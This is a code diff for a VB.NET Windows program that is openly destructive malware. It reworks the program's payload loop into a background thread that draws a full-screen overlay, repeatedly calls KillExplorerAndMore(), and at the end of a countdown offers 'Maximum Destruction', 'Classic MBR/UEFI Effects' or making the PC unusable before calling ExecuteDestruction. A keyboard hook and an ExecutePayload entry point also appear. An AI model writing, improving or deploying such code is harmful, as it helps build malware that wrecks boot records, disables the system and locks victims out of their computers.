@@ -22,6 +22,7 @@ Public Class Form1
     ' Hook handle and callback delegate
     Private hookID As IntPtr = IntPtr.Zero
     Private hookCallbackDelegate As HookProc
+    Private countdownThread As Thread
 
     ' Delegate for hook callback
     Private Delegate Function HookProc(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
@@ -457,51 +458,6 @@ Public Class Form1
         End Sub
     End Class
 
-    Private Sub AnimationTimer_Tick(sender As Object, e As EventArgs) Handles AnimationTimer.Tick
-        ' Timer tick function, applies effects and updates countdown timer
-        Try
-
-            ' Launch full-screen effects
-            If overlay Is Nothing OrElse overlay.IsDisposed Then
-                overlay = New FullScreenOverlay()
-                AddHandler overlay.FormClosed, AddressOf OnOverlayFormClosed
-                overlay.Show()
-            End If
-
-            Dim g As Graphics = overlay.CreateGraphics()
-            g.SmoothingMode = SmoothingMode.None
-
-            ' Draw portal effect
-            overlay.ApplyPortalEffect(g)
-
-            ' Update the countdown timer label
-            If overlay.countdownTime > 0 Then
-                overlay.countdownTime -= 1
-                overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
-                KillExplorerAndMore()
-            Else
-                ' When countdown finishes, prompt user for destruction option
-                Dim options As String() = {
-                "Maximum Destruction",
-                "Classic MBR/UEFI Effects",
-                "Surprise Me",
-                "Just Make Unusable My PC Without Destruction"
-            }
-
-                Dim choice As String = overlay.PromptUserForChoice("Select a destruction option:", options)
-
-                If Not String.IsNullOrEmpty(choice) Then
-                    overlay.timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
-                    Thread.Sleep(5000) ' Optional: Adjust as needed
-                    overlay.ExecuteDestruction(choice)
-                End If
-            End If
-
-        Catch ex As Exception
-            MessageBox.Show("An error occurred during animation: " & ex.Message, "Animation Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
-        End Try
-    End Sub
-
     ' Declare the GetAsyncKeyState function
     <DllImport("user32.dll")>
     Private Shared Function GetAsyncKeyState(vKey As Integer) As Short
@@ -509,6 +465,66 @@ Public Class Form1
 
     Private Const VK_MENU As Integer = &H12 ' Alt key
     Private Const VK_TAB As Integer = &H9
+
+    Private Sub StartAnimationLoop()
+        ' Initialize and display the overlay if it doesn't already exist
+        If overlay Is Nothing OrElse overlay.IsDisposed Then
+            overlay = New FullScreenOverlay()
+            AddHandler overlay.FormClosed, AddressOf OnOverlayFormClosed
+            overlay.Show()
+        End If
+
+        ' Set up and start the countdown thread
+        countdownThread = New Thread(AddressOf CountdownLoop)
+        countdownThread.Start()
+    End Sub
+
+    Private Sub CountdownLoop()
+        While overlay.countdownTime > 0
+            ' Reduce the countdown time
+            overlay.countdownTime -= 1
+
+            ' Update the overlay on the UI thread
+            Me.Invoke(Sub() UpdateOverlay())
+
+            ' Wait for 1 second to simulate the timer tick
+            Threading.Thread.Sleep(1000)
+        End While
+
+        ' When the countdown reaches zero, complete the actions on the UI thread
+        Me.Invoke(Sub() OnCountdownComplete())
+    End Sub
+
+    Private Sub UpdateOverlay()
+        If overlay IsNot Nothing AndAlso Not overlay.IsDisposed Then
+            ' Create graphics and apply the portal effect
+            Dim g As Graphics = overlay.CreateGraphics()
+            g.SmoothingMode = SmoothingMode.None
+            overlay.ApplyPortalEffect(g)
+
+            ' Update the countdown timer label
+            overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
+            KillExplorerAndMore()
+        End If
+    End Sub
+
+    Private Sub OnCountdownComplete()
+        ' When countdown finishes, prompt user for destruction option
+        Dim options As String() = {
+        "Maximum Destruction",
+        "Classic MBR/UEFI Effects",
+        "Surprise Me",
+        "Just Make Unusable My PC Without Destruction"
+    }
+
+        Dim choice As String = overlay.PromptUserForChoice("Select a destruction option:", options)
+
+        If Not String.IsNullOrEmpty(choice) Then
+            overlay.timerLabel.Text = "Time's up! ANTIVIRUSDEFENDER IS EVERYWHERE!"
+            Threading.Thread.Sleep(5000) ' Optional: Adjust as needed
+            overlay.ExecuteDestruction(choice)
+        End If
+    End Sub
 
     Private Function HookCallback(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
         If nCode >= 0 AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
@@ -1380,7 +1396,7 @@ Public Class Form1
     Private Sub ExecutePayload()
         Try
             Try
-                AnimationTimer.Start()
+                StartAnimationLoop()
             Catch ex As Exception
                 Console.WriteLine("Error in AnimationTimer.Start: " & ex.Message)
             End Try
